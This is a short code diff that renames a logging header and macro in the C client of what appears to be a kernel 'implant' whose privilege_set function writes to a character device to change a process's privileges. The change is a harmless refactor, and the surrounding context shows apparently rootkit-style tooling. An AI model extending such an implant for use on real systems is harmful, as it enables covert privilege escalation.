@@ -1,6 +1,6 @@
 #include <client.h>
 #include <privilege.h>
-#include <debug.h>
+#include <log.h>
 
 #include <stdio.h>
 
@@ -8,7 +8,7 @@ int privilege_set(pid_t pid, int perm)
 {
 	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
 	if (implant == NULL) {
-		IMLOG_WARN("Failed to access the implant interface");
+		IMLOG_WARNING("Failed to access the implant interface");
 		return -1;
 	}
 
